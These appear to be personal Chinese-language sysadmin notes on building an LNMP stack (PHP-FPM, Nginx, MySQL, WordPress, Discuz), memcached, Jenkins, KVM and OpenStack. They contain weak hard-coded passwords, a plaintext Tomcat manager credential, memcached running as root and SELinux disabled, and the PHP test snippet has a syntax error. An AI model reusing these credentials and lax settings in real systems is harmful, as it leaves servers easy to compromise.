Installing PHP FPM config:        /application/php5.3.27/etc/
Installing PHP FPM man page:      /application/php5.3.27/man/man8/
Installing PHP FPM status page:      /application/php5.3.27/share/php/fpm/
Installing build environment:     /application/php5.3.27/lib/php/build/
Installing header files:          /application/php5.3.27/include/php/
Installing helper programs:       /application/php5.3.27/bin/
  program: phpize
  program: php-config
Installing man pages:             /application/php5.3.27/man/man1/
  page: phpize.1
  page: php-config.1
Installing PEAR environment:      /application/php5.3.27/lib/php/
[PEAR] Archive_Tar    - installed: 1.3.11
[PEAR] Console_Getopt - installed: 1.3.1
warning: pear/PEAR requires package "pear/Structures_Graph" (recommended version 1.0.4)
warning: pear/PEAR requires package "pear/XML_Util" (recommended version 1.2.1)
[PEAR] PEAR           - installed: 1.9.4
Wrote PEAR system config file at: /application/php5.3.27/etc/pear.conf
You may want to add: /application/php5.3.27/lib/php to your php.ini include_path
[PEAR] Structures_Graph- installed: 1.0.4
[PEAR] XML_Util       - installed: 1.2.1
/home/lavenliu/tools/php-5.3.27/build/shtool install -c ext/phar/phar.phar /application/php5.3.27/bin
ln -s -f /application/php5.3.27/bin/phar.phar /application/php5.3.27/bin/phar
Installing PDO headers:          /application/php5.3.27/include/php/ext/pdo/
[root@lnmp php-5.3.27]# echo $?
0
ln -s /application/php-5.3.27 /application/php
	#+END_SRC

	附php5.5编译安装参数，
	#+BEGIN_SRC sh
./configure \
--prefix=/application/php-5.5.33 \
--with-mysql=mysqlnd \
--with-iconv-dir=/usr/local/libiconv \
--with-freetype-dir \
--with-jpeg-dir \
--with-png-dir \
--with-zlib \
--with-libxml-dir=/usr \
--enable-xml \
--disable-rpath \
--enable-bcmath \
--enable-shmop \
--enable-sysvsem \
--enable-inline-optimization \
--with-curl \
--enable-mbregex \
--enable-fpm \
--enable-mbstring \
--with-mcrypt \
--with-gd \
--enable-gd-native-ttf \
--with-openssl \
--with-mhash \
--enable-pcntl \
--enable-sockets \
--with-xmlrpc \
--enable-soap \
--enable-short-tags \
--enable-static \
--with-xsl \
--with-fpm-user=nginx \
--with-fpm-group=nginx \
--enable-ftp
make 
make install
ln -s /application/php-5.5.33/ /application/php/
	#+END_SRC
**** 配置PHP及进程管理
     #+BEGIN_SRC sh
cd /home/lavenliu/tools/php-5.3.27
cp php.ini-production /application/php/lib/php.ini
cd /application/php/etc
cp php-fpm.conf.default php-fpm.conf
/application/php/sbin/php-fpm
ps -ef |grep php-fpm
root      22356      1  0 13:47 ?        00:00:00 php-fpm: master process (/application/php5.3.27/etc/php-fpm.conf)
nginx     22357  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22358  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22359  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22360  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22361  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22362  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22363  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22364  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22365  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22366  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22367  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22368  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22369  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22370  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22371  22356  0 13:47 ?        00:00:00 php-fpm: pool www            
nginx     22372  22356  0 13:47 ?        00:00:00 php-fpm: pool www
[root@lnmp etc]# netstat -antup |grep php-fpm
tcp        0      0 127.0.0.1:9000              0.0.0.0:*                   LISTEN      22356/php-fpm
# php.ini参数
egrep -v ";|^$" /application/php/etc/php-fpm.conf
[global]
pid = run/php-fpm.pid
error_log = log/php-fpm.log
log_level = error
 
rlimit_files = 32768
 
events.mechanism = epoll
[www]
user = nginx
group = nginx
listen = 127.0.0.1:9000
 
pm = dynamic
pm.max_children = 5
pm.start_servers = 2
pm.min_spare_servers = 1
pm.max_spare_servers = 3
 
pm.max_requests = 2048
 
slowlog = log/$pool.log.slow
	#+END_SRC
**** Nginx与PHP整合
     	根据原理图的流程，接下来配置Nginx的配置文件，把php的请求转给php处
	理。在nginx.conf的blog虚拟主机extra/blog.conf配置文件里增加如下配
	置，
	#+BEGIN_SRC sh
location ~ .*\.(php|php5)?$ {
	root html/blog;
	fastcgi_pass  127.0.0.1:9000;
	fastcgi_index index.php;
	include       fastcgi.conf;
}
	#+END_SRC

	完整的blog.conf配置为，
	#+BEGIN_SRC sh
[root@lnmp extra]# cat blog.conf 
server {               # 第一个server标签，表示一个独立的虚拟主机站点
    listen       80;   # 提供服务外的端口，默认80
    server_name  blog.lavenliu.com; # 提供服务的域名，主机名
    root   html/blog; # 站点的根目录，相当于Nginx安装目录
    
    location / { # 第一个location标签开始
        index  index.html index.htm; # 默认的首页文件，多个用空格分开
    }

    location ~ .*\.(php|php5)?$ {
        # 注意这里的站点根目录问题，不然会产生404的错误，
        # 这里与blog公用一个站点目录，html/blog
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        include fastcgi.conf;
    }
	
    access_log logs/access_blog.log main;
}
	#+END_SRC

	写一个phpinfo()的函数测试一下，Nginx与PHP是否已整合成功，
	#+BEGIN_SRC sh
vi /application/nginx/html/blog/phpinfo.php
<?php
phpinfo();
?>
	#+END_SRC

	可以在客户端进行访问，http://blog.lavenliu.com/phpinfo.php 如果有
	输出说明，整合成功。
**** PHP与MySQL整合
     接下来PHP与MySQL进行整合，

	 一个测试PHP与MySQL整合成功与否的脚本，
	 #+BEGIN_SRC php
<?php
$test_link = mysql_connect('localhost', 'root', '123456');
if ($test_link) {
	   echo "mysql successful join php"
   } else {
	   echo mysql_error();
}
?>
     #+BEGIN_SRC
**** PHP服务控制权限防止木马安全解决方案
     #+BEGIN_SRC sh
cd /application/nginx/html
[root@lnmp html]# find ./blog/ -type f |xargs chmod 644
[root@lnmp html]# find ./blog/ -type d |xargs chmod 755
[root@lnmp html]# mkdir blog/wp-content/uploads -p
[root@lnmp html]# chown -R nginx.nginx blog/wp-content/uploads/
	#+END_SRC
**** 安装bbs程序
	 bbs使用的是Discuz。
	 
	 设置BBS的伪静态化，
	 1. 全局
	 2. SEO设置
	 3. 勾选"URL静态化"一栏右侧的复选框
	 4. 勾选"Rewrite兼容性"
	 5. 提交
	 6. 点击"URL静态化"右侧的"查看当前的Rewrite规则"
	 7. 拉到网页的最下面，把Nginx的Rewrite规则，粘贴到Nginx相应的虚拟主机下

     设置权限，
	#+BEGIN_SRC sh
cd /data/www/
[root@lnmp01 www]# chown -R root.root bbs/
[root@lnmp01 www]# find ./bbs/ -type f|xargs chmod 644
[root@lnmp01 www]# find ./bbs/ -type d|xargs chmod 755
[root@lnmp01 www]# chown -R nginx.nginx bbs/uc_server
	#+END_SRC

     新建一个测试的帖子，写入一些内容，然后在数据库上进行查看是否有相
     应的数据产生：
	 #+BEGIN_SRC sh
mysql -ubbs -h192.168.20.160 -p
mysql> use bbs;
mysql> select * from lt_forum_post\G
*************************** 1. row ***************************
        pid: 1
        fid: 2
        tid: 1
      first: 1
     author: lavenliu
   authorid: 1
    subject: 第一个BBS帖子
   dateline: 1458080291
    message: 这是我的第一篇BBS帖子。欢迎来访。

      useip: 192.168.20.1
       port: 58176
  invisible: 0
  anonymous: 0
     usesig: 1
     htmlon: 0
  bbcodeoff: -1
  smileyoff: -1
parseurloff: 0
 attachment: 0
       rate: 0
  ratetimes: 0
     status: 0
       tags: 
    comment: 0
replycredit: 0
   position: 1
	 #+END_SRC
**** 安装blog程序
     	#+BEGIN_SRC sh
mysql> create database wordpress;
Query OK, 1 row affected (0.00 sec)

mysql> show databases;           
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)

mysql> grant all on wordpress.* to wordpress@'localhost' identified by '123456';
Query OK, 0 rows affected (0.00 sec)

mysql> flush privileges;
Query OK, 0 rows affected (0.01 sec)

mysql> select user,host from mysql.user where user='wordpress';
+-----------+-----------+
| user      | host      |
+-----------+-----------+
| wordpress | localhost |
+-----------+-----------+
1 row in set (0.00 sec)

mysql> select user,host from mysql.user;
+-----------+-----------+
| user      | host      |
+-----------+-----------+
| root      | 127.0.0.1 |
| root      | localhost |
| wordpress | localhost |
+-----------+-----------+
3 rows in set (0.00 sec)
	#+END_SRC

	设置权限，
	#+BEGIN_SRC sh
[root@lnmp02 html]# chown -R root.root blog/
[root@lnmp02 html]# find ./blog/ -type f|xargs chmod 644
[root@lnmp02 html]# find ./blog/ -type d|xargs chmod 755
[root@lnmp02 html]# mkdir blog/wp-content/uploads
[root@lnmp02 html]# chown -R nginx.nginx blog/wp-content/uploads/
	#+END_SRC
**** 为博客程序配置实现URL伪静态
     在WordPress后台-设置-固定链接-自定义结构，输入下面的代码，最后保
	 存更改即可。"/archives/%post_id%.html"，注意，不加两边的引号。
	#+BEGIN_SRC sh
[root@lnmp extra]# cat blog.conf 
server {               # 第一个server标签，表示一个独立的虚拟主机站点
    listen       80;   # 提供服务外的端口，默认80
    server_name  blog.lavenliu.com; # 提供服务的域名，主机名
    root         html/blog; # 站点的根目录，相当于Nginx安装目录
    index  index.php index.html index.htm; # 默认的首页文件，多个用空格分开

    location / { # 第一个location标签开始
        if (-f $request_filename/index.html){
            rewrite (.*) $1/index.html break;
        }
        if (-f $request_filename/index.php){
            rewrite (.*) $1/index.php;
        }
        if (!-f $request_filename){
            rewrite (.*) /index.php;
        }
    }

    location ~ .*\.(php|php5)?$ {
        # 注意这里的站点根目录问题，不然会产生404的错误，
        # 这里与blog公用一个站点目录，html/blog
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        include fastcgi.conf;
    }
	
    access_log logs/access_blog.log main;
}
	#+END_SRC
** 附录
*** proxy_next_upstream健康检查
	#+BEGIN_EXAMPLE
	# proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
	# Nginx尝试连接后端主机失败的次数，这个数值是配合proxy_next_upstream，fastcgi_next_upstream和
	# memcached_next_upstream这三个参数使用的，当Nginx接收后端服务器返回这三个参数定义
	# 的状态码的时候，会将这个请求转发给正常工作的后端服务器，例如404,502,503。max_fails
	# 默认值是1。
	#+END_EXAMPLE
** 遇到的问题
*** ip_hash与backup不能同时启用
	#+BEGIN_SRC sh
# /application/nginx/sbin/nginx -t
nginx: [emerg] balancing method does not support parameter "backup" in /application/nginx-1.9.1/conf/nginx.conf:15
nginx: configuration file /application/nginx-1.9.1/conf/nginx.conf test failed
	#+END_SRC
*** 安装PHP时出现的问题
**** 找不到mysqlclient.so库
	 #+BEGIN_SRC sh
echo "/application/mysql/lib" >> /etc/ld.so.conf
ldconfig
	 #+END_SRC
**** 找不到phar.phar文件
	 在php-5.3.27目录下，
	 #+BEGIN_SRC sh
touch ext/phar/phar.phar
	 #+END_SRC
	 然后，重新make和make install。
*** client_max_body_size问题
	#+BEGIN_SRC sh
Syntax:	client_max_body_size size;
Default: client_max_body_size 1m;
Context: http, server, location
	#+END_SRC
	Sets the maximum allowed size of the client request body,
	specified in the “Content-Length” request header field. If the
	size in a request exceeds the configured value, the 413 (Request
	Entity Too Large) error is returned to the client. Please be aware
	that browsers cannot correctly display this error. Setting size to
	0 disables checking of client request body size.
* Memcached
  memcached最吸引人的地方主要在于它的分布式。分布式对于互联网应用来讲，
  按照用途基本上可划分为三种方式：

  1. 分布式计算
  2. 分布式存储
  3. 两者兼有之

  memcached是分布式存储的一种。我们常见的分布式存储大多数是将N台设备
  (server或者单独的存储)构建成盘阵，而memcached旨在构建一个高速的内
  存池。更通俗地讲：分布式计算是将N颗CPU组装成一颗CPU，分布式慢速存储
  是将N个硬盘组装成一个大硬盘，memcached是将N块内存组装成一块大内存。

  memcached特点：
  + 协议简单
	#+BEGIN_EXAMPLE
	memcached的服务器客户端通信并不使用复杂的XML等格式。
	而使用简单的基于文本行的协议。因此，通过telnet就可以在memcached上
	保存和取得数据了。
	#+END_EXAMPLE
  + 基于libevent的事件处理
	#+BEGIN_EXAMPLE
	libevent是个程序库，它将Linux的epoll、BSD类操作系统的kqueue等事件处
	理功能封装成统一的接口。即使对服务器的连接数增加，也能发挥O(1)的性
	能。 memcached使用这个libevent库，因此能在Linux、BSD、Solaris等操作
	系统上发挥其高性能。
	#+END_EXAMPLE
  + 内置内存存储方式
	#+BEGIN_EXAMPLE
	为了提高性能，memcached中保存的数据都存储在memcached内置的内存存
	储空间中。 由于数据仅存在于内存中，因此重启memcached、重启操作系
	统会导致全部数据消失。 另外，内容容量达到指定值之后，就基于
	LRU(Least Recently Used)算法自动删除不使用的缓存。 memcached本身
	是为缓存而设计的服务器，因此并没有过多考虑数据的永久性问题。
	#+END_EXAMPLE
  + memcached不互相通信的分布式
** 安装与启动
   1. 安装

	  安装libevent
	  #+BEGIN_SRC sh
	  # tar -xf libevent-xxxx.tar.gz -C /usr/local/src
	  # cd /usr/local/src/libevent
	  # ./configure --prefix=/usr/local/libevent
	  # make && make install
	  #+END_SRC

	  安装memcached
	  #+BEGIN_SRC sh
	  # tar -xf memcached-xxx.tar.gz -C /usr/local/src
	  # cd /usr/local/src/memcached
	  # ./configure --prefix=/usr/local/memcached --with-libevent=/usr/local/libevent
	  # make && make install
	  #+END_SRC
   2. 启动
	  #+BEGIN_SRC bash
	  # memcached -d -m 64 -u root -l 192.168.56.101 -p 11211 -c 2048 -P \
	  > /var/run/memcached.pid
	  #+END_SRC
	  选项说明：
	  #+BEGIN_EXAMPLE
	  -d 项是启动一个守护进程，
	  -m 分配给Memcache使用的内存数量，单位是MB，我这里是10MB，
	  -u 运行Memcache的用户，我这里是root，
	  -l 监听的服务器IP地址，如果有多个地址的话，我这里指定了服务器的IP地址192.168.0.200，
	  -p 设置Memcache监听的端口，我这里设置了11211，最好是1024以上的端口，
	  -c 项是最大运行的并发连接数，默认是1024，这里设置了2048，按照服务器的负载量来设定，
	  -P 设置保存Memcache的pid文件，我这里是保存在/var/run/memcached.pid
	  #+END_EXAMPLE
   3. 结束memcached进程
	  #+BEGIN_SRC bash
	  # kill -9 `cat /var/run/memcached.pid`
	  #+END_SRC
** Memcached基本操作实例
   命令格式：
   #+BEGIN_EXAMPLE
   <command> <key> <flags> <exptime> <bytes> [<version>]\r\n
   <datablock> \r\n
   <status> \r\n
   command set无论如何都进行存储
   add只有数据不存在时进行添加
   replace只有数据存在时进行替换
   append往后追加
   prepend往前追加
   key 字符串 小于250个字符，不包含空格和控制字符
   flags 客户端用来标识数据格式的数值，如json，xml，压缩等
   exptime 存活时间，0为永远，小于30天
   bytes byte字节数，不包含\r\n，根据长度截取存/取的字符串，可以是0
   datablock 文本行，以\r\n结尾
   #+END_EXAMPLE

   1. 连接memcached
	  #+BEGIN_SRC bash
	  # telnet 192.168.56.101 11211
	  #+END_SRC
   2. 存储命令set/add/replace
	  + datablock长度必须正确
		#+BEGIN_SRC bash
		set liu 32 0 4
		perl
		
		get liu

		set liu 32 0 4
		mysql
		#+END_SRC
	  + add只能添加不存在的key
		#+BEGIN_SRC bash
		set liu 32 0 4
		perl

		add liu 32 0 5
		mysql
		#+END_SRC
	  + replace只能替换已有的key
		#+BEGIN_SRC bash
		set liu 32 0 4
		perl

		replace liu 32 0 5
		mysql

		get liu

		replace xxxx 32 0 5
		yyyyy
		#+END_SRC
   3. 读取命令get
   4. 删除命令delete
   5. 计数命令incr/decr
   6. 统计命令status
** MSM
   For the most simple integration you just need to have a tomcat (6,
   7 or 8) and a memcached installed (or s.th. supporting the
   memcached protocol). In your production environment you probably
   will have several tomcats and you should also have several
   memcached nodes available, on different pieces of hardware. You
   can use sticky sessions or non-sticky sessions,
   memcached-session-manager (msm) supports both operation modes.
*** 使用何种序列化策略
	There are several session serialization strategies available, as
	they are described on SerializationStrategies. The default
	strategy uses java serialization and is already provided by the
	memcached-session-manager jar. Other strategies are provided by
	separate jars, in the section below you'll see which jars are
	required for which strategy.
*** 配置Tomcat
	配置文件为：conf/context.xml
	
	所需JAR包的版本要一致。比如这里的是Tomcat8版本，使用的msm的版本也
	要选用tc8的版本。
	1. Add memcached-session-manager jars to tomcat
	   + 必选jar包
		 - memcached-session-manager-${version}.jar
		 - memcached-session-manager-tc8-${version}.jar
		 - spymemcached-2.11.1.jar
	2. Configure memcached-session-manager as <Context> Manager
	   + sticky sessions + kryo
		 #+BEGIN_EXAMPLE
		 <Context>
		   ...
		   <Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager"
			 memcachedNodes="n1:host1.yourdomain.com:11211,n2:host2.yourdomain.com:11211"
			 failoverNodes="n1"
			 requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
			 transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
			 />
		 </Context>
		 #+END_EXAMPLE
	   + non-sticky sessions + kryo
		 #+BEGIN_EXAMPLE
		 <Context>
		   ...
		   <Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager"
			 memcachedNodes="n1:host1.yourdomain.com:11211,n2:host2.yourdomain.com:11211"
			 sticky="false"
			 sessionBackupAsync="false"
			 lockingMode="uriPattern:/path1|/path2"
			 requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
			 transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
			 />
		 </Context>
		 #+END_EXAMPLE
* Redis
* ELK Stack
* Maven
  #+BEGIN_EXAMPLE
  ~/.m2/settings.xml - 该文件包含了用户相关的认证，仓库和其它信息的配置，
  用来自定义Maven的行为。
  
  ~/.m2/repository   - 该目录是你本地的仓库。当你从远程Maven仓库下载依赖
  的时候，Maven在你本地仓库存储了这个依赖的一个副本。
  #+END_EXAMPLE

  使用Maven进行手工构建项目：
  #+BEGIN_SRC sh
  mvn install package -Dmaven.test.skip=true  
  #+END_SRC
* Jenkins
** 安装与使用
   在安装Jenkins之前，操作系统上需要有Java环境的支持。Java环境的安装
   与配置需事先配置。

   安装很简单，到官网下载需要的版本。然后，放到本地的Tomcat的webapps
   目录下，即可完成安装。

   几乎需要很少的配置，就可以把Jenkins跑起来。使用，参考自己写的
   Jenkins.pdf文档。
** 用户管理
   1. 在“Configure Global Security”中，选择“启用安全”
   2. 在“访问控制-安全域”中，选择“Jenkins专有用户数据库”
   3. 配置用户权限
** 何时构建项目
*** 定时构建项目
   	Minute Hour DOM Month Dow
   	#+BEGIN_EXAMPLE
   	Minute (0-59)
   	Hour   (0-23)
   	DOM    (1-31)
   	MONTH  (1-12)
   	DOW    (0-7)
   	#+END_EXAMPLE
*** Polling the SCM
   	Polling involves asking the version control server at regular
   	intervals if any changes have been committed. If any changes have
   	been made to the source code in the project, Jenkins kicks off a
   	build. Polling is usually a relatively cheap operation, so you can
   	poll frequently to ensure that a build kicks off rapidly after
   	changes have been committed.  The more frequent the polling is, the
   	faster the build jobs will start, and the more accurate the
   	feedback about what change broke the build will be.
** 备份和恢复Jenkins
   所有的设置、构建日志及手工归档的资料均存在于JENKINS_HOME目录下，所
   以，只需要备份JENKINS_HOME下的所有文件。备份时，可以不用停止Jenkins
   服务，恢复的时候需要先停止Jenkins。
** 遇到的问题
*** POM文件位置问题
   	pom.xml的位置问题。

   	解决办法：

   	如我们的项目地址为：https://61.153.100.206/svn/zillion，
   	1. 如果我们的pom.xml文件在zillion目录下，
	   在“Build”下的“Root POM”默认即可。
   	2. 如果不在zillion目录下，如在zillion/trunk/fundParent/目录下，在
	   “Build”下的“Root POM”填写“trunk/fundParent/pom.xml”
*** 403 Error
   	错误描述：“The username you provided is not allowed to use the
   	text-based Tomcat Manage”

   	解决办法：

   	增加manager-script角色
   	#+BEGIN_EXAMPLE
<role rolename="manager"/>
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<user username="liuchuan" password="zibang123" roles="manager-script,manager-gui"/>
   	#+END_EXAMPLE
* Distributed HA Database Arch
* Git
* SVN
* KVM
  | 虚拟化产品 | 谁在用                         | 从业钱景如何 | 学习难度如何 |
  |------------+--------------------------------+--------------+--------------|
  | VMWare     | 政府、金融等传统行业使用比较多 | ****         | ****         |
  | XEN        | 使用虚拟化比较早的公司         | ***          | *****        |
  | HyperV     | 使用微软产品比较多的公司       | ****         | ****         |
  | KVM        | 互联网公司                     | *****        | *****        |
  检查服务器是否支持虚拟化
  #+BEGIN_SRC sh
grep -E --color '(vmx|svm)' /proc/cpuinfo
  #+END_SRC
** 测试环境
   | 主机名            | IP地址                                  | 备注  |
   |-------------------+-----------------------------------------+-------|
   | kvm01.example.com | 192.168.20.129 - eth1 (HostOnly) (内网) | kvm01 |
   |                   | 192.168.19.129 - eth0 (NAT) (外网)      |       |
   |-------------------+-----------------------------------------+-------|
   | kvm02.example.com | 192.168.20.130 - eth1 (HostOnly) (内网) | kvm02 |
   |                   | 192.168.19.130 - eth0 (NAT) (外网)      |       |
** 安装EPEL源
   在所有节点安装EPEL源
   #+BEGIN_SRC sh
rpm -ivh http://mirrors.ustc.edu.cn/fedora/epel//6/x86_64/epel-release-6-8.noarch.rpm
   #+END_SRC
** KVM支持的CPU种类
   #+BEGIN_SRC sh
# /usr/libexec/qemu-kvm -cpu ?
x86       Opteron_G5  AMD Opteron 63xx class CPU                      
x86       Opteron_G4  AMD Opteron 62xx class CPU                      
x86       Opteron_G3  AMD Opteron 23xx (Gen 3 Class Opteron)          
x86       Opteron_G2  AMD Opteron 22xx (Gen 2 Class Opteron)          
x86       Opteron_G1  AMD Opteron 240 (Gen 1 Class Opteron)           
x86        Broadwell  Intel Core Processor (Broadwell)                
x86          Haswell  Intel Core Processor (Haswell)                  
x86      SandyBridge  Intel Xeon E312xx (Sandy Bridge)                
x86         Westmere  Westmere E56xx/L56xx/X56xx (Nehalem-C)          
x86          Nehalem  Intel Core i7 9xx (Nehalem Class Core i7)       
x86           Penryn  Intel Core 2 Duo P9xxx (Penryn Class Core 2)    
x86           Conroe  Intel Celeron_4x0 (Conroe/Merom Class Core 2)   
x86      cpu64-rhel5  QEMU Virtual CPU version (cpu64-rhel5)          
x86      cpu64-rhel6  QEMU Virtual CPU version (cpu64-rhel6)          
x86             n270  Intel(R) Atom(TM) CPU N270   @ 1.60GHz          
x86           athlon  QEMU Virtual CPU version 0.12.1                 
x86         pentium3                                                  
x86         pentium2                                                  
x86          pentium                                                  
x86              486                                                  
x86          coreduo  Genuine Intel(R) CPU           T2600  @ 2.16GHz 
x86           qemu32  QEMU Virtual CPU version 0.12.1                 
x86            kvm64  Common KVM processor                            
x86         core2duo  Intel(R) Core(TM)2 Duo CPU     T7700  @ 2.40GHz 
x86           phenom  AMD Phenom(tm) 9550 Quad-Core Processor         
x86           qemu64  QEMU Virtual CPU version 0.12.1                 

Recognized CPUID flags:
  f_edx: pbe ia64 tm ht ss sse2 sse fxsr mmx acpi ds clflush pn pse36 pat cmov mca pge mtrr sep apic cx8 mce pae msr tsc pse de vme fpu
  f_ecx: hypervisor rdrand f16c avx osxsave xsave aes tsc-deadline popcnt movbe x2apic sse4.2|sse4_2 sse4.1|sse4_1 dca pcid pdcm xtpr cx16 fma cid ssse3 tm2 est smx vmx ds_cpl monitor dtes64 pclmulqdq|pclmuldq pni|sse3
  extf_edx: 3dnow 3dnowext lm|i64 rdtscp pdpe1gb fxsr_opt|ffxsr fxsr mmx mmxext nx|xd pse36 pat cmov mca pge mtrr syscall apic cx8 mce pae msr tsc pse de vme fpu
  extf_ecx: perfctr_nb perfctr_core topoext tbm nodeid_msr tce fma4 lwp wdt skinit xop ibs osvw 3dnowprefetch misalignsse sse4a abm cr8legacy extapic svm cmp_legacy lahf_lm
   #+END_SRC
** 安装KVM管理工具QEMU
   节点安装QEME工具
   #+BEGIN_SRC sh
yum install -y qemu-kvm qemu-kvm-tools virt-manager libvirt
   #+END_SRC

   启动libvirtd服务
   #+BEGIN_SRC sh
/etc/init.d/libvirtd start
   #+END_SRC
   此时，会生成一个virbr0的虚拟网卡，可以使用"brctl show"
*** virsh工具
	该工具是由libvirt包得到，虚拟机的XML文件存放在/etc/libvirt/qemu目
	录下。硬性修改XML文件并不能影响虚拟机。

	1. 启动虚拟机
	   #+BEGIN_SRC sh
	   virsh start CentOS-6.5-x86_64
	   #+END_SRC
	2. 关闭虚拟机
	   #+BEGIN_SRC sh
	   virsh shutdown CentOS-6.5-x86_64
	   #+END_SRC
	3. 查看已有的虚拟机
	   #+BEGIN_SRC sh
	   virsh list --all
	   #+END_SRC
	4. define与undefine
	   #+BEGIN_SRC sh
	   virsh undefine CentOS-6.5-x86_64
       virsh define /opt/CentOS-6.5-x86_64.xml
	   #+END_SRC
*** virt-top工具
** 创建虚拟机镜像
   准备ISO镜像文件，并上传到宿主机
   #+BEGIN_SRC sh
qemu-img create -f raw /opt/CentOS-6.5-x86_64.raw 5G
qemu-img info /opt/CentOS-6.5-x86_64.raw
   #+END_SRC
** 安装虚拟机
   #+BEGIN_SRC sh
virt-install --virt-type kvm --name CentOS-6.5-x86_64 --ram 512 \
   --cdrom=/opt/CentOS-6.5-x86_64-bin-DVD1.iso \
   --disk path=/opt/CentOS-6.5-x86_64.raw \
   --network network=default \
   --graphics vnc,listen=0.0.0.0 \
   --noautoconsole --os-type=linux \
   --os-variant=rhel6
   #+END_SRC
** 制作虚拟机镜像
   1. 删除虚拟机上的/etc/udev/rules.d/70-persistent-net.rules文件
   2. 删除网卡配置文件里的MAC地址及UUID
** brctl的使用
   创建br0网桥
   #+BEGIN_SRC sh
   # brctl addbr br0                        #添加br0网桥
   # brctl addif br0 eth1                   #把eth1加入br0网桥
   # ip addr del dev eth1 192.168.20.129/24 #删除eth1上的IP地址
   # ifconfig br0 192.168.20.129/24 up      #把eth1上的IP地址设置在br0上
   #+END_SRC

   创建思路：
   #+BEGIN_EXAMPLE
   首先创建桥接网卡br0，把桥接网卡关联到eth1网卡上，删除eth1上的IP地址，
   把eth1上的IP地址添加到桥接网卡br0上
   #+END_EXAMPLE

   编辑KVM虚拟机的XML配置文件，修改其网络连接方式：
   
   #+BEGIN_SRC sh
   # 编辑之前，关闭KVM虚拟机
   # virsh shutdown CentOS-6.5-x86_64
   # virsh edit CentOS-6.5-x86_64
     52     <interface type='bridge'>  # 此行需要修改，由"default"改为"bridge"
     53       <mac address='52:54:00:68:56:c8'/>
     54       <source bridge='br0'/>  # 此行需要修改，由"network"改为"br0"
     55       <model type='virtio'/>
     56       <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0'/>
     57     </interface>
   #+END_SRC
  
   编辑完毕，启动KVM虚拟机：
   #+BEGIN_SRC sh
   # virsh start CentOS-6.5-x86_64
   # brctl show
     bridge name	bridge id		STP enabled	interfaces
     br0		8000.000c291c1f98	no		eth1
							                vnet0 # KVM虚拟机的vnet0网卡已经附加在br0上了
     virbr0		8000.525400d07d1f	yes		virbr0-nic
   #+END_SRC
** KVM优化
   #+BEGIN_EXAMPLE
   cat /sys/kernel/mm/transparent_hugepage/enabled
   #+END_EXAMPLE

*** CPU优化
*** 内存优化
*** I/O优化
	virtio
* Docker
  InfoQ
* OpenStack
  OpenStack是一个开源的IaaS(基础设施即服务)云计算平台，让任何人都可
  以自行建立和提供云端运算服务，具体可以从devstack脚本熟悉它。

  OpenStack由一系列相互关联的项目提供云基础设施解决方案的各个组件。目
  前，核心项目(11个)：
  + Keystone
	#+BEGIN_EXAMPLE
	
	#+END_EXAMPLE
	
  + Nova
	#+BEGIN_EXAMPLE
	提供计算资源池，直接对象是VM
	#+END_EXAMPLE

  + Glance
	#+BEGIN_EXAMPLE
	为VM提供镜像服务
	#+END_EXAMPLE

  + Cinder
	#+BEGIN_EXAMPLE
	提供云硬盘，挂载到VM上。
	#+END_EXAMPLE

  + Horizon
	#+BEGIN_EXAMPLE
	通过调用各个组件的API来管理VM。
	#+END_EXAMPLE

  + Swift
	#+BEGIN_EXAMPLE
	
	#+END_EXAMPLE

  + Neutron
	#+BEGIN_EXAMPLE
	
	#+END_EXAMPLE

  + Trove
	#+BEGIN_EXAMPLE
 	
	#+END_EXAMPLE

  + Heat
	#+BEGIN_EXAMPLE
	
	#+END_EXAMPLE

  + Ceilometer
	#+BEGIN_EXAMPLE
	
	#+END_EXAMPLE

  + Sahara
	#+BEGIN_EXAMPLE
	
	#+END_EXAMPLE
** 测试环境
   测试环境：
   | Hostname                | IP                               | 备注     |
   |-------------------------+----------------------------------+----------|
   | linux-node1.example.com | 192.168.20.133 (eth0) - HostOnly | 控制节点 |
   |                         | 192.168.19.132 (eth1)            |          |
   | linux-node2.example.com | 192.168.20.134 (eth0) - HostOnly | 计算节点 |
   |                         | 192.168.19.133 (eth1)            |          |

   实验架构：
	1. 控制节点
	2. 计算节点
	   #+BEGIN_EXAMPLE
	   运行KVM虚拟机
	   #+END_EXAMPLE
*** 操作系统准备
    1. 主机名是FQDN格式
    2. 安装NTP
    3. SELinux关闭
	   #+BEGIN_SRC sh
	   # getenforce
       Disabled
	   #+END_SRC
    4. 安装EPEL源
	   在所有控制节点、存储节点、计算节点上安装EPEL
  	   #+BEGIN_SRC sh
	   # rpm -ivh http://mirrors.ustc.edu.cn/fedora/epel/6/x86_64/epel-release-6-8.noarch.rpm
	   #+END_SRC
    5. 安装rdo源
       #+BEGIN_SRC sh
       # 官网原来的RPM地址修改了，
       # yum install http://repos.fedorapeople.org/repos/openstack/openstack-icehouse/rdo-release-icehouse-4.noarch.rpm
       # 修改为了如下地址
